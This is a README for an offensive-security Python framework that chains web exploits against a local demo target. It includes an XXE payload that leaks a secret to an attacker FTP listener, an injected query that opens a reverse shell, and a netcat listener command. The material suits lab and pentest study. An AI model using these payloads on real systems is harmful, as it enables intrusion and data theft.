# horrors

> A micro-framework for writing attack scenarios starring multiple vulnerabilities.

## About

This little asyncio-based framework was created in order to simplify exploit chain development for vulnerable applications. All you have to do is:

```python
async def send_xxe(scenario):
    """Post XXE payload

    """
    await scenario.background(
        requests.post,
        'http://{rhost}:{rport}/xml-import/'.format(**scenario.context),
        data='<?xml version="1.0" ?><something>ftp://{lhost}:{lport_ftp}</something>'.format(**scenario.context),
        headers=scenario.context['post_headers'],
        proxies=scenario.context['proxy']
    )


async def reverse_shell(scenario):
    """Wait for `xxe` event triggered when remote client connects via FTP and sends the secret

    """
    await scenario.background(
        requests.post,
        'http://{rhost}:{rport}/query/'.format(**scenario.context),
        data='secret={secret}&query=DROP+TABLE+IF+EXISTS+[...]{lhost}+{lport_reverse}'.format(**scenario.context),
        headers=scenario.context['post_headers'],
        proxies=scenario.context['proxy']
    )


if __name__ == "__main__":
    context = {
        'rhost': '127.0.0.1',
        'rport': 8008,
        'lhost': '127.0.0.1',
        'lport_reverse': 4444,
        'lport_ftp': 2121,
        'proxy': {'http': 'http://127.0.0.1:8080'},
        'post_headers': {'Content-Type': 'application/x-www-form-urlencoded'},
    }

    ftpd = services.FTPReader()
    ftpd.set_state('xxe', when=triggers.DataMatch(r'.+SecretKey=(.+);', bucket='secret'))

    story = scenarios.Scenario(**context)
    story.spawn(ftpd)
    story.add(send_xxe)
    story.add(reverse_shell, when='xxe')
    story.play()
```

## Installation

    $ git clone https://github.com/tasooshi/horrors
    $ cd horrors; pip3 install .

## Example

A full example is included in the `horrors/example` directory. Try it out by running:

    $ nc -lv4 4444
    $ horrors/example/victim.py
    $ horrors/example/attacker.py

### Demo

[![example](https://img.youtube.com/vi/VQwysZItPrE/0.jpg)](https://www.youtube.com/watch?v=VQwysZItPrE)

## Changelog

* **2021/08/10** Beta (v0.2)
   * Refactored and largely simplified codebase: it is now easier to reuse code between multiple scenarios by mixing functions, wrapping in classes etc.
   * Steps are not executed sequentially, you decide depending on signals (events) registered when adding to scenario (`story.add(func, when='something')`).
   * Removed asyncio.Event dependency since I was not able to make it work the way I wanted.
* **2021/07/30** Initial release (v0.1)
